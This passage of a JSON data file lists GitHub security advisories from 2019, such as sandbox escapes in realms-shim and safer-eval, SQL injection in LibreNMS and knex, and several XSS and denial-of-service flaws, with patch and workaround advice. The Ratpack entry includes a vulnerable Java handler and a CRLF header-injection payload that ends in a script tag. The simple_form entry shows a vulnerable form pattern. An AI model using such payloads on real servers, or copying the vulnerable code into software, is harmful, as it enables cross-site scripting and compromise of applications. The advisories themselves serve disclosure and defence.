    "summary": "Access control bypass possible due to _bsontype attribute handling"
  },
  {
    "ghsaId": "GHSA-j7mj-748x-7p78",
    "publishedAt": "2019-10-22T14:40:42Z",
    "description": "An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image.",
    "summary": "DOS attack in Pillow when processing specially crafted image files"
  },
  {
    "ghsaId": "GHSA-r53w-g4xm-3gc6",
    "publishedAt": "2019-10-21T21:59:13Z",
    "description": "In haml versions prior to version 5.0.0.beta.2, when using user input to perform tasks on the server, characters like < > \" ' must be escaped properly. In this case, the ' character was missed. An attacker can manipulate the input to introduce additional attributes, potentially executing code.",
    "summary": "Cross-site scripting in Haml"
  },
  {
    "ghsaId": "GHSA-7cg8-pq9v-x98q",
    "publishedAt": "2019-10-21T21:58:55Z",
    "description": "## sandbox breach via rewrite transformer\r\n\r\n### Impact\r\n\r\nThe realms-shim is intended to provide a \"safe evaluator\" which executes arbitrary strings code with limited authority. This provides a \"sandbox\" which only has access to the specific objects and power that the caller chooses to expose. The `evaluate()` function it implements takes two additional arguments: `endowments` (which are exposed in the global lexical scope), and an options bag. The `transforms` option is a list of functions that are applied to the string of code, to apply Babel-like transformations before it gets executed (e.g. to implement syntax extensions).\r\n\r\nA bug was found in the transformation pipeline that exposed a primal-Realm object to one of the transform functions. The confined code could use this to escape the sandbox and compromise the Realm which created it. This generally leads to a full compromise of the application.\r\n\r\nAll uses of the Realms shim that evaluate unaudited third-party code are vulnerable.\r\n\r\n### Patches\r\n\r\nThe bug is fixed in the 1.2.1 version of `realms-shim`. All users should upgrade to this release.\r\n\r\n### Workarounds\r\n\r\nThe `evaluate()` function (and the accompanying `transforms` option) is available to all confined code, hence the only way to prevent its use would be to carefully audit the confined code for calls to `evaluate()` that use the transformation feature. Given how flexible JavaScript is, this should not be considered a reliable workaround. Upgrading to the latest realms-shim is the recommended mitigation.\r\n\r\n### References\r\n\r\n* Realms proposal: https://github.com/tc39/proposal-realms/\r\n* SES: https://github.com/Agoric/SES/\r\n* more information will appear in a post on https://agoric.com/blog\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n\r\n* Open an issue in the [realms-shim](https://github.com/Agoric/realms-shim) repository\r\n* Submit security bugs via email at `security` (at `agoric.com`)\r\n* Contact us on twitter: `@agoric`\r\n\r\n",
    "summary": "Critical severity vulnerability that affects realms-shim"
  },
  {
    "ghsaId": "GHSA-r3x4-wr4h-pw33",
    "publishedAt": "2019-10-21T21:58:34Z",
    "description": "safer-eval before 1.3.4 are vulnerable to Arbitrary Code Execution. A payload using constructor properties can escape the sandbox and execute arbitrary code.",
    "summary": "A payload using constructor properties can escape the sandbox and execute arbitrary code"
  },
  {
    "ghsaId": "GHSA-58v4-qwx5-7f59",
    "publishedAt": "2019-10-21T16:12:13Z",
    "description": "knex.js versions before 0.19.5 are vulnerable to SQL Injection attack. Identifiers are escaped incorrectly as part of the MSSQL dialect, allowing attackers to craft a malicious query to the host DB.",
    "summary": "SQL injection attack via malicious query possible due to incorrectly escaped identifiers in MSSQL dialect"
  },
  {
    "ghsaId": "GHSA-mvqp-q37c-wf9j",
    "publishedAt": "2019-10-21T16:08:43Z",
    "description": "## CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\n\nVersions of Ratpack 0.9.1 through and including 1.7.4 are vulnerable to [HTTP Response Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting), \r\nif untrusted and unsanitized data is used to populate the headers of an HTTP response.\r\nAn attacker can utilize this vulnerability to have the server issue any HTTP response they specify.\r\n\r\nIf your application uses arbitrary user input as the value of a response header it is vulnerable.\r\nIf your application does not use arbitrary values as response header values, it is not vulnerable.\r\n\r\nPreviously, Ratpack did not validate response header values.\r\nNow, adding a header value that contains the header value termination characters (CRLF) produces a runtime exception.\r\nSince there is no mechanism for escaping or encoding the termination characters in a String, a runtime exception is necessary.\r\n\r\nAs potentially dangerous values now cause runtime exceptions, it is a good idea to continue to validate and sanitize any user-supplied values being used as response headers.\r\n\r\nWe would like to thank [Jonathan Leitschuh](https://github.com/JLLeitschuh) for reporting this vulnerability.\r\n\r\n### Vulnerable Example\r\n\r\nThe following example server uses a query parameter value as a response header, without validating or sanitizing it.\r\n```java\r\nRatpackServer startedServer =  RatpackServer.start(server -> {\r\n    server.handlers(chain -> chain.all(ctx -> {\r\n        // User supplied query parameter\r\n        String header = ctx.getRequest().getQueryParams().get(\"header\");\r\n        // User supplied data used to populate a header value.\r\n        ctx.header(\"the-header\", header)\r\n            .render(\"OK!\");\r\n    }));\r\n});\r\n```\r\n\r\nSending a request to the server with the following value for the `header` query param would allow the execution of arbitrary Javascript.\r\n\r\n```\r\nContent-Type: text/html\r\nX-XSS-Protection: 0\r\n\r\n<script>alert(document.domain)</script>\r\n```\r\n\r\n### Impact\r\n\r\n- Cross-User Defacement\r\n- Cache Poisoning\r\n- Cross-Site Scripting\r\n- Page Hijacking\r\n\r\n### Patches\r\n\r\nThis vulnerability has been patched in Ratpack version 1.7.5.\r\n\r\n### Root Cause\r\n\r\nThe root cause was due to using the netty `DefaultHttpHeaders` object with verification disabled.\r\n\r\nhttps://github.com/ratpack/ratpack/blob/af1e8c8590f164d7dd84d4212886fad4ead99080/ratpack-core/src/main/java/ratpack/server/internal/NettyHandlerAdapter.java#L159\r\n\r\nThis vulnerability is now more clearly documented in the Netty documentation: https://github.com/netty/netty/pull/9646\r\n\r\n### Workarounds\r\n\r\nThe workaround for this vulnerability is to either not use arbitrary input as response header values or validate such values before being used to ensure they don't contain a carriage return and/or line feed characters.\r\n\r\n### References\r\n\r\n - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https://cwe.mitre.org/data/definitions/113.html)\r\n - Fix commit: https://github.com/ratpack/ratpack/commit/efb910d38a96494256f36675ef0e5061097dd77d\r\n \r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [ratpack/ratpack](https://github.com/ratpack/ratpack/issues)\r\n* Ask in our [Slack channel](https://slack-signup.ratpack.io/)\r\n\n",
    "summary": "Moderate severity vulnerability that affects io.ratpack:ratpack-core"
  },
  {
    "ghsaId": "GHSA-v7x3-7hw7-pcjg",
    "publishedAt": "2019-10-21T16:02:33Z",
    "description": "## Go Modules Vulnerability Disclosure\n\n### Impact\r\n\r\nTemporary repository tokens were leaked into Pull Requests comments in during certain Go Modules update failure scenarios.\r\n\r\n### Patches\r\n\r\nThe problem has been patched. Self-hosted users should upgrade to v19.38.7 or later.\r\n\r\n### Workarounds\r\n\r\nDisable Go Modules support.\r\n\r\n### References\r\n\r\nBlog post: https://renovatebot.com/blog/go-modules-vulnerability-disclosure\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [Renovate](http://github.com/renovatebot/renovate)\r\n* Email us at [support@renovatebot.com](mailto:support@renovatebot.com)\r\n\n",
    "summary": "Moderate severity vulnerability that affects renovate"
  },
  {
    "ghsaId": "GHSA-hgch-jjmr-gp7w",
    "publishedAt": "2019-10-17T18:27:30Z",
    "description": "safer-eval before 1.3.2 are vulnerable to Arbitrary Code Execution. A payload using constructor properties can escape the sandbox and execute arbitrary code.",
    "summary": "Sandbox Breakout / Arbitrary Code Execution in safer-eval"
  },
  {
    "ghsaId": "GHSA-2mh8-gx2m-mr75",
    "publishedAt": "2019-10-17T18:15:16Z",
    "description": "The ASN.1 parser in Bouncy Castle Crypto (aka BC Java) 1.63 can trigger a large attempted memory allocation, and resultant OutOfMemoryError error, via crafted ASN.1 data. This is fixed in 1.64.",
    "summary": "Out-of-Memory Error in Bouncy Castle Crypto"
  },
  {
    "ghsaId": "GHSA-f6vf-pq8c-69m4",
    "publishedAt": "2019-10-16T18:31:17Z",
    "description": "Connect2id Nimbus JOSE+JWT before v7.9 can throw various uncaught exceptions while parsing a JWT, which could result in an application crash (potential information disclosure) or a potential authentication bypass.",
    "summary": "Crash or authentication bypass possible due to uncaught exceptions while parsing a JWT"
  },
  {
    "ghsaId": "GHSA-582f-p4pg-xc74",
    "publishedAt": "2019-10-15T20:06:16Z",
    "description": "The csv-parse module before 4.4.6 for Node.js is vulnerable to Regular Expression Denial of Service. The __isInt() function contains a malformed regular expression that processes large crafted input very slowly. This is triggered when using the cast option.",
    "summary": "The csv-parse module before 4.4.6 for Node.js is vulnerable to Regular Expression Denial of Service"
  },
  {
    "ghsaId": "GHSA-c427-hjc3-wrfw",
    "publishedAt": "2019-10-15T19:27:05Z",
    "description": "A Cascading Style Sheets (CSS) injection vulnerability in Swagger UI before 3.23.11 allows attackers to use the Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration, such as exfiltration of a CSRF token value. In other words, this product intentionally allows the embedding of untrusted JSON data from remote servers, but it was not previously known that <style>@import within the JSON data was a functional attack method.",
    "summary": "CSS-based input field value exfiltration possible via relative path overwrite"
  },
  {
    "ghsaId": "GHSA-49pj-69vf-c689",
    "publishedAt": "2019-10-14T21:43:19Z",
    "description": "The netaddr gem before 2.0.4 for Ruby has misconfigured file permissions, such that a gem install may result in 0777 permissions in the target filesystem.",
    "summary": "gem install may result in 0777 permissions on the target filesystem"
  },
  {
    "ghsaId": "GHSA-974j-wjxx-wggj",
    "publishedAt": "2019-10-14T21:23:26Z",
    "description": "API Platform version from 2.2.0 to 2.3.5 contains an Incorrect Access Control vulnerability in GraphQL delete mutations that can result in a user authorized to delete a resource can delete any resource. This attack appears to be exploitable via the user must be authorized. This vulnerability appears to have been fixed in 2.3.6.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-rfh8-25h9-mhgf",
    "publishedAt": "2019-10-14T21:12:08Z",
    "description": "YII2-CMS v1.0 has XSS in protected\\core\\modules\\home\\models\\Contact.php via a name field to /contact.html.",
    "summary": "XSS possible via a name field to /contact.html"
  },
  {
    "ghsaId": "GHSA-g9xh-3w5g-229r",
    "publishedAt": "2019-10-11T18:43:33Z",
    "description": "An issue was discovered in LibreNMS through 1.47. It does not parameterize all user supplied input within database queries, resulting in SQL injection. An authenticated attacker can subvert these database queries to extract or manipulate data, as demonstrated by the graph.php sort parameter.",
    "summary": "SQL injection possible via user supplied input within database queries "
  },
  {
    "ghsaId": "GHSA-878x-85hc-gc4g",
    "publishedAt": "2019-10-11T18:43:29Z",
    "description": "An issue was discovered in LibreNMS 1.50.1. A SQL injection flaw was identified in the ajax_rulesuggest.php file where the term parameter is used insecurely in a database query for showing columns of a table, as demonstrated by an ajax_rulesuggest.php?debug=1&term= request.",
    "summary": "SQL injection possible due to term parameter being used insecurely in a database query"
  },
  {
    "ghsaId": "GHSA-r336-jxfr-4c3c",
    "publishedAt": "2019-10-11T18:43:25Z",
    "description": "An issue was discovered in LibreNMS 1.50.1. An authenticated user can perform a directory traversal attack against the /pdf.php file with a partial filename in the report parameter, to cause local file inclusion resulting in code execution.",
    "summary": "Directory traversal attack possible leading to code execution from local file inclusion"
  },
  {
    "ghsaId": "GHSA-f4hh-xxqh-wgpq",
    "publishedAt": "2019-10-11T18:43:20Z",
    "description": "An issue was discovered in LibreNMS through 1.47. Information disclosure can occur: an attacker can fingerprint the exact code version installed and disclose local file paths.",
    "summary": "An attacker can fingerprint the exact code version installed and disclose local file paths"
  },
  {
    "ghsaId": "GHSA-w5r2-gvgf-mpm8",
    "publishedAt": "2019-10-11T18:43:13Z",
    "description": "An issue was discovered in LibreNMS 1.50.1. The scripts that handle graphing options (includes/html/graphs/common.inc.php and includes/html/graphs/graphs.inc.php) do not sufficiently validate or encode several fields of user supplied input. Some parameters are filtered with mysqli_real_escape_string, which is only useful for preventing SQL injection attacks; other parameters are unfiltered. This allows an attacker to inject RRDtool syntax with newline characters via the html/graph.php and html/graph-realtime.php scripts. RRDtool syntax is quite versatile and an attacker could leverage this to perform a number of attacks, including disclosing directory structure and filenames, disclosing file content, denial of service, or writing arbitrary files. NOTE: relative to CVE-2019-10665, this requires authentication and the pathnames differ.",
    "summary": "User supplied input not sufficiently validated or encoded"
  },
  {
    "ghsaId": "GHSA-277v-gwfr-hmpj",
    "publishedAt": "2019-10-11T18:43:06Z",
    "description": "An issue was discovered in LibreNMS through 1.47. A number of scripts import the Authentication libraries, but do not enforce an actual authentication check. Several of these scripts disclose information or expose functions that are of a sensitive nature and are not expected to be publicly accessible.",
    "summary": "Authentication checks not enforced in several scripts"
  },
  {
    "ghsaId": "GHSA-7qmg-qg53-mrp8",
    "publishedAt": "2019-10-11T18:41:59Z",
    "description": "On Apache JSPWiki, up to version 2.11.0.M4, a carefully crafted plugin link invocation could trigger an XSS vulnerability on Apache JSPWiki, related to InfoContent.jsp, which could allow the attacker to execute javascript in the victim's browser and get some sensitive information about the victim.",
    "summary": "XSS vulnerability possible via a carefully crafted plugin link invocation"
  },
  {
    "ghsaId": "GHSA-3rx2-x6mx-grj3",
    "publishedAt": "2019-10-11T18:41:54Z",
    "description": "On Apache JSPWiki, up to version 2.11.0.M4, a carefully crafted plugin link invocation could trigger an XSS vulnerability on Apache JSPWiki, related to the WYSIWYG editor, which could allow the attacker to execute javascript in the victim's browser and get some sensitive information about the victim.",
    "summary": "XSS vulnerability possible via a carefully crafted plugin link invocation"
  },
  {
    "ghsaId": "GHSA-gwfq-qwmp-x9xg",
    "publishedAt": "2019-10-11T18:41:50Z",
    "description": "On Apache JSPWiki, up to version 2.11.0.M4, a carefully crafted plugin link invocation could trigger an XSS vulnerability on Apache JSPWiki, related to the Page Revision History, which could allow the attacker to execute javascript in the victim's browser and get some sensitive information about the victim.",
    "summary": "XSS vulnerability possible via a carefully crafted plugin link invocation"
  },
  {
    "ghsaId": "GHSA-g6ww-2x43-h963",
    "publishedAt": "2019-10-11T18:41:44Z",
    "description": "On Apache JSPWiki, up to version 2.11.0.M4, a carefully crafted plugin link invocation could trigger an XSS vulnerability on Apache JSPWiki, related to the plain editor, which could allow the attacker to execute javascript in the victim's browser and get some sensitive information about the victim.",
    "summary": "XSS vulnerability possible via a carefully crafted plugin link invocation"
  },
  {
    "ghsaId": "GHSA-p979-4mfw-53vg",
    "publishedAt": "2019-10-11T18:41:23Z",
    "description": "Netty before 4.1.42.Final mishandles whitespace before the colon in HTTP headers (such as a \"Transfer-Encoding : chunked\" line), which leads to HTTP request smuggling.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-53x6-4x5p-rrvv",
    "publishedAt": "2019-10-11T18:41:08Z",
    "description": "The file name encoding algorithm used internally in Apache Commons Compress 1.15 to 1.18 can get into an infinite loop when faced with specially crafted inputs. This can lead to a denial of service attack if an attacker can choose the file names inside of an archive created by Compress.",
    "summary": "Denial of Service in Apache Commons Compress"
  },
  {
    "ghsaId": "GHSA-x4w5-r546-x9qh",
    "publishedAt": "2019-10-11T18:40:38Z",
    "description": "The html-pdf package 2.2.0 for Node.js has an arbitrary file read vulnerability via an HTML file that uses XMLHttpRequest to access a file:/// URL.",
    "summary": "Arbitrary file read vulnerability via an HTML file that uses XMLHttpRequest to access a file:/// URL"
  },
  {
    "ghsaId": "GHSA-67cx-rhhq-mfhq",
    "publishedAt": "2019-10-11T18:28:07Z",
    "description": "## Local file disclosure through LaTeX injection\n\n### Impact\r\nAn external audit of the Indico codebase has discovered a vulnerability in Indico's LaTeX sanitization code, which could have malicious users to run unsafe LaTeX commands on the server. Such commands allowed for example to read local files (e.g. `indico.conf`).\r\n\r\nAs far as we know it is not possible to write files or execute code using this vulnerability.\r\n\r\n### Patches\r\nYou need to update to [Indico 2.2.3](https://github.com/indico/indico/releases/tag/v2.2.3) as soon as possible.\r\nWe also released [Indico 2.1.10](https://github.com/indico/indico/releases/tag/v2.1.10) in case you cannot update to 2.2 for some reason.\r\nSee https://docs.getindico.io/en/stable/installation/upgrade/ for instructions on how to update.\r\n\r\n### Workarounds\r\nSetting `XELATEX_PATH = None` in `indico.conf` will result in an error when building a PDF, but without being able to run xelatex, the vulnerability cannot be abused.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open a thread in [our forum](https://talk.getindico.io/)\r\n* Email us privately at [indico-team@cern.ch](mailto:indico-team@cern.ch)\r\n\n",
    "summary": "High severity vulnerability that affects indico"
  },
  {
    "ghsaId": "GHSA-v3f6-f29f-rgvp",
    "publishedAt": "2019-10-10T19:31:31Z",
    "description": "In Drupal 8.x prior to 8.3.7 When creating a view, you can optionally use Ajax to update the displayed data via filter parameters. The views subsystem/module did not restrict access to the Ajax endpoint to only views configured to use Ajax. This is mitigated if you have access restrictions on the view. It is best practice to always include some form of access restrictions on all views, even if you are using another module to display them.",
    "summary": "Access to Ajax endpoint not restricted to only views configured to use Ajax"
  },
  {
    "ghsaId": "GHSA-pwfw-mgfj-7g3g",
    "publishedAt": "2019-10-08T16:30:17Z",
    "description": "## possible DoS in signature verification and signature malleability \r\n\r\n### Impact\r\nCode using `VerifyingKey.verify()` and `VerifyingKey.verify_digest()` may receive exceptions other than the documented `BadSignatureError` when signatures are malformed. If those other exceptions are not caught, they may lead to program termination and thus Denial of Service\r\n\r\nCode using `VerifyingKey.verify()` and `VerifyingKey.verify_digest()` with `sigdecode` option using `ecdsa.util.sigdecode_der` will accept signatures even if they are not properly formatted DER. This makes the signatures malleable. It impacts only applications that later sign the signatures or verify signatures of signatures, e.g. Bitcoin.\r\n\r\nAll versions between 0.5 and 0.13.2 (inclusive) are thought to be vulnerable. Code before 0.5 may be vulnerable but didn't receive extended analysis to rule this issue out.\r\n\r\n### Patches\r\nThe patches have been merged to `master` branch in https://github.com/warner/python-ecdsa/pull/115.\r\nThe backported patches for a release in the 0.13 branch are in https://github.com/warner/python-ecdsa/pull/124\r\n\r\nThey are part of the 0.13.3 release.\r\n\r\nThere are no plans to backport them to earlier releases.\r\n\r\n### Workarounds\r\nIt may be possible to prevent the Denial of Service by catching also `UnexpectedDER`, `IndexError` and `AssertionError` exceptions. That list hasn't been verified to be complete though. If those exceptions are raised, the signature verification process should consider the signature to be invalid.\r\n\r\nTo remediate signature malleability and the Denial of Service vulnerability, it may be possible to first verify that the signature is properly DER formatted ECDSA-Sig-Value, as defined in [RFC3279](https://tools.ietf.org/html/rfc3279), before passing it to `verify()` or `verify_digest()` methods. If the signature is determined to not follow the DER or encode a different structure, the signature verification process should consider the signature to be invalid.\r\n\r\n### References\r\nhttps://en.bitcoinwiki.org/wiki/Transaction_Malleability\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory please open an issue in [python-ecdsa](https://github.com/warner/python-ecdsa/issues) project.\r\n",
    "summary": "Low severity vulnerability that affects ecdsa"
  },
  {
    "ghsaId": "GHSA-mgv2-57vj-99xc",
    "publishedAt": "2019-10-07T16:54:24Z",
    "description": "## Test breaking\n\n### Impact\r\nIn v1.2.0, tests are broken: all tests are always succeeding. If tests are looking for security vulnerabilities, these were compromised.\r\n\r\n### Patches\r\nUsers should upgrade to `v1.2.1`\r\n\r\n### Workarounds\r\nUsers who don't use eye.js for looking for vulnerabilities are safe. Upgrading will just fix some bugs.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [EyeJS](https://github.com/arguiot/EyeJS)\r\n* Email us at [arguiot@gmail.com](mailto:arguiot@gmail.com)\r\n\n",
    "summary": "Low severity vulnerability that affects eye.js"
  },
  {
    "ghsaId": "GHSA-85rf-xh54-whp3",
    "publishedAt": "2019-10-07T16:52:13Z",
    "description": "### Impact\n\nA path traversal vulnerability was detected in iodine's static file service. This vulnerability effects any application running iodine's static file server on an effected iodine version.\n\nMalicious URL drafting may cause the static file server to attempt a response containing data from files that shouldn't be normally accessible from the public folder.\n\n### Patches\n\nThe vulnerability was patched in version 0.7.34. Please upgrade to the latest version.\n\n### Workarounds\n\nA possible workaround would be to disable the static file service and it's `X-Sendfile` support, sending static files using nginx or a source code solution (sending the data dynamically).\n\nHowever, it would be better to upgrade iodine to the latest version, as it also contains non-security related fixes.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email [Boaz Segev](https://github.com/boazsegev)",
    "summary": "Malicious URL drafting attack against iodines static file server may allow path traversal"
  },
  {
    "ghsaId": "GHSA-6jg8-7333-554w",
    "publishedAt": "2019-10-04T17:56:12Z",
    "description": "## realms-shim / SES sandbox escapes\n\n### Impact\r\n\r\nThe `realms-shim` package implements the [Realms proposal](https://github.com/tc39/proposal-realms/). The [SES](https://github.com/Agoric/SES/) package builds upon Realms to build secure sandboxes for executing untrusted Javascript code. Sandboxed code cannot modify the primordial objects (aka \"prototype poisoning\") within the sandbox, nor can it interact with other objects unless it is first given a reference to those objects. This provides an \"object-capability safe\" execution environment.\r\n\r\nSeveral bugs were found in `realms-shim`, which allow the confined code to escape the sandbox and compromise the \"primal realm\" (the one which created the sandbox). This generally leads to a full compromise of the application, since the primal realm includes access to e.g. `require('fs')`, from which the attacker can rewrite the application's source code.\r\n\r\nUntil very recently, the only convenient way to use the `realms-shim` package was to include it as a git submodule (the first tagged release was made on 18-Sep-2019), or to use SES. Consequently the vulnerable population includes users of SES-0.6.2 or older, users of realms-shim-1.1.2 or older, and users of any package that use a git-submodule to include the realms-shim.\r\n\r\n### Patches\r\n\r\nThe bugs have been fixed in realms-shim-1.2.0, which has been incorporated into SES-0.6.3 . All users should upgrade to one of these releases.\r\n\r\n### Workarounds\r\n\r\nSES and the Realms feature are designed to protect against arbitrary and unreviewed attacker-supplied code. Applications which rely upon this property must upgrade to the newer versions of the libraries to fix the problem.\r\n\r\nOther applications might be in a position to have humans review the code before executing it under a Realm, or accept very limited subsets of Javascript. In these cases, the review process might be changed to exclude these attacks.\r\n\r\nHowever, given how flexible Javascript is, this should not be considered a reliable workaround. Upgrading to the newer realms-shim and SES is the recommended mitigation.\r\n\r\n### References\r\n\r\n* Realms proposal: https://github.com/tc39/proposal-realms/\r\n* SES: https://github.com/Agoric/SES/\r\n* a detailed blog post will be made on https://agoric.com/blog with more information\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n\r\n* Open an issue in the [realms-shim](https://github.com/Agoric/realms-shim) or [SES](https://github.com/Agoric/SES) repositories\r\n* Submit security bugs via email at `security` (at `agoric.com`)\r\n* Contact us on twitter: `@agoric`\r\n\n",
    "summary": "Critical severity vulnerability that affects realms-shim and ses"
  },
  {
    "ghsaId": "GHSA-cxw4-9qv9-vx5h",
    "publishedAt": "2019-09-30T19:42:28Z",
    "description": "### Impact\nThe CBOR library supports optional tags that enable CBOR objects to contain references to objects within them. Versions earlier than 4.0 resolved those references automatically. While this by itself doesn't cause much of a security problem, a denial of service can happen if those references are deeply nested and used multiple times (so that the same reference to the same object occurs multiple times), and if the decoded CBOR object is sent to a serialization method such as `EncodeToBytes`, `ToString`, or `ToJSONString`, since the objects referred to are expanded in the process and take up orders of magnitude more memory than if the references weren't resolved.\n\nThe impact of this problem on any particular system varies.  In general, the risk is higher if the system allows users to send arbitrary CBOR objects without authentication, or exposes a remote endpoint in which arbitrary CBOR objects can be sent without authentication.\n\n### Patches\nThis problem is addressed in version 4.0 by disabling reference resolution by default.  Users should use the latest version of this library, which is 4.0 at the time of this writing.\n\n### Workarounds\nSince version 3.6, an encoding option (`resolvereferences=true` or `resolvereferences=false`) in CBOREncodeOptions sets whether the CBOR processor will resolve these kinds of references when decoding a CBOR object.  Set `resolvereferences=false` to disable reference resolution.\n\nIn version 3.6, if the method used `CBORObject.Read()` or `CBORObject.DecodeFromBytes()` to decode a serialized CBOR object, call the overload that takes `CBOREncodeOptions` as follows:\n\n    CBORObject.DecodeFromBytes(bytes, new CBOREncodeOptions(\"resolvereferences=false\"));\n\nIn versions 3.5 and earlier, this issue is present only if the CBOR object is an array or a map.  If the application does not expect a decoded CBOR object to be an array or a map, it should check the CBOR object's type before encoding that object, as follows:\n\n    if (cbor.Type != CBORType.Array && cbor.Type != CBORType.Map) {\n       cbor.EncodeToBytes();\n    }\n\nAlternatively, for such versions, the application can use `WriteTo` to decode the CBOR object to a so-called \"limited memory stream\", that is, a `Stream` that throws an exception if too many bytes would be written.  How to write such a limited-memory stream is nontrivial and beyond the scope of this advisory.\n\n    using(var stream = new LimitedMemoryStream(100000)) { // Limit to 100000 bytes\n         cbor.WriteTo(stream);\n         return stream.ToBytes();\n    }\n\nTo check whether a byte array representing a CBOR object might exhibit this problem, check whether the array contains the byte 0xd8 followed immediately by either 0x19 or 0x1d.  This check catches all affected CBOR objects but may catch some non-affected CBOR objects (notably integers and byte strings).\n\n### References\n\nSee the Wikipedia article [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) and the related issue in [Kubernetes](https://github.com/kubernetes/kubernetes/issues/83253).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CBOR repository](https://github.com/peteroupc/CBOR).",
    "summary": "High severity vulnerability that affects PeterO.Cbor"
  },
  {
    "ghsaId": "GHSA-r74q-gxcg-73hx",
    "publishedAt": "2019-09-30T19:41:15Z",
    "description": "## Incorrect Access Control in `file_method?` in `lib/simple_form/form_builder.rb`; a user-supplied string is invoked as a method call\r\n\r\n### Impact\r\nFor pages that build a form using user input, it is possible for an attacker to manipulate the input and send any method present in the form object. For example:\r\n\r\n```erb\r\n<%= simple_form_for @user do |f| %>\r\n  <%= f.label @user_supplied_string %>\r\n  ...\r\n<% end %>\r\n```\r\n\r\nThe string provided in the variable `@user_supplied_string` would be invoked as a method call inside the `@user` object (unless the string contains any of the following: `password`, `time_zone`, `country`, `email`, `phone` and `url`).\r\n\r\nBy manipulation that input, an attacker could do any of the following:\r\n\r\n- Code execution (call actions like `#destroy`)\r\n- Denial of Service (by executing a computation intensive method)\r\n- Information Disclosure (check the presence of methods, leak user information)\r\n\r\n### Patches\r\nThe problem was fixed in version `5.0`. Although it's a major version, there should be no issues with upgrading for `4.x`. The reason it was released in a major version is that the configuration `SimpleForm.file_methods` was deprecated in order to fix the problem.\r\n\r\n### Workarounds\r\nThe issue only happens with pages that build forms based on user-provided input. If your application doesn't do that, you're not affected.\r\nA workaround is to explicitly pass which type you want for an input since the issue lies on Simple Form's automatically discovery of input types. This can be done using the `as` option, like the following:\r\n```erb\r\n<%= form.input :avatar, as: :file %>\r\n```\r\n\r\n### References\r\n[TDB]\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [https://github.com/plataformatec/simple_form](https://github.com/plataformatec/simple_form)\r\n* Email us at [opensource@plataformatec.com.br](mailto:opensource@plataformatec.com.br)\r\n",
    "summary": "High severity vulnerability that affects simple_form"
  },
  {
    "ghsaId": "GHSA-v6cj-r88p-92rm",
    "publishedAt": "2019-09-30T19:31:59Z",
    "description": "## Denial of Service\n\n### Impact\r\n\r\nAffected Centra versions will, when not in stream mode, buffer responses to requests into memory with no size limit. This issue affects anyone requesting content from untrusted sources.\r\n\r\n### Patches\r\n\r\nVersion 2.4.0 resolves the issue by limiting the size of buffered response body.\r\n\r\n### Workarounds\r\n\r\nAttempting workarounds isn't recommended. Updating is preferred.\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory, open an issue in [ethanent/centra](https://github.com/ethanent/centra).\r\n\n",
    "summary": "Low severity vulnerability that affects centra"
  },
  {
    "ghsaId": "GHSA-5m2v-hc64-56h6",
    "publishedAt": "2019-09-30T16:05:32Z",
    "description": "In Rubyzip before 1.3.0, a crafted ZIP file can bypass application checks on ZIP entry sizes because data about the uncompressed size can be spoofed. This allows attackers to cause a denial of service (disk consumption).",
    "summary": "Crafted ZIP file can bypass application checks on ZIP entry sizes causing a denial of service"
  },
  {
    "ghsaId": "GHSA-8jhx-9gf4-hhf5",
    "publishedAt": "2019-09-27T20:01:00Z",
    "description": "The makandra consul gem through 1.0.2 for Ruby has Incorrect Access Control.",
    "summary": "High severity vulnerability that affects consul"
  },
  {
    "ghsaId": "GHSA-fgmr-vx7c-5wj6",
    "publishedAt": "2019-09-26T21:30:34Z",
    "description": "The code which checks HMAC in form submissions used String.equals() for comparisons, which results in a timing side channel for the comparison of the HMAC signatures. This could lead to remote code execution if an attacker is able to determine the correct signature for their payload. The comparison should be done with a constant time algorithm instead.",
    "summary": "Timing attack on HMAC signature comparison in Apache Tapestry"
  },
  {
    "ghsaId": "GHSA-85cw-hj65-qqv9",
    "publishedAt": "2019-09-23T18:33:45Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariDataSource. This is a different vulnerability than CVE-2019-14540.",
    "summary": "Polymorphic Typing issue in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-h822-r4r5-v8jg",
    "publishedAt": "2019-09-23T18:33:25Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariConfig.",
    "summary": "Polymorphic Typing issue in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-q8wc-9xvp-g3c3",
    "publishedAt": "2019-09-23T18:33:18Z",
    "description": "Sakai through 12.6 allows XSS via a chat user name.",
    "summary": "Moderate severity vulnerability that affects org.sakaiproject:chat-base"
  },
  {
    "ghsaId": "GHSA-rwpr-83g3-96g7",
    "publishedAt": "2019-09-23T18:33:07Z",
    "description": "The breadcrumbs contributed module through 0.2.0 for Padrino Framework allows XSS via a caption.",
    "summary": "Moderate severity vulnerability that affects padrino-contrib"
  },
  {
    "ghsaId": "GHSA-6m4r-cgm3-6q7q",
    "publishedAt": "2019-09-23T18:32:54Z",
    "description": "Status Board 1.1.81 has reflected XSS via logic.ts.",
    "summary": "Moderate severity vulnerability that affects status-board"
  },
  {
    "ghsaId": "GHSA-8864-rhmw-5m6f",
    "publishedAt": "2019-09-23T18:32:42Z",
